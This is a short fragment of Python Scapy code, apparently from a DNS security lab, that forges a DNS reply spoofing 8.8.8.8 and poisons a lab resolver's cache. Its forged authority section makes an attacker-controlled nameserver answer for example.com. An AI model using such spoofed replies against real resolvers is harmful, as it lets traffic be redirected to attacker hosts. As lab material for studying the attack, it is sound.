...
# query
ip_q  = IP(dst='172.17.0.3',src='172.17.0.1') # dst: dns; src:attacker
...
# reply
ip_r = IP(dst='172.17.0.3', src='8.8.8.8', chksum=0)
udp_r = UDP(dport=33333, sport=53, chksum=0)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
 # The Authority Section
NSsec = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.yuanzhongsheng.net')
Addsec = DNSRR(rrname='ns.yuanzhongsheng.net', type='A', ttl=259200, rdata='172.17.0.1')
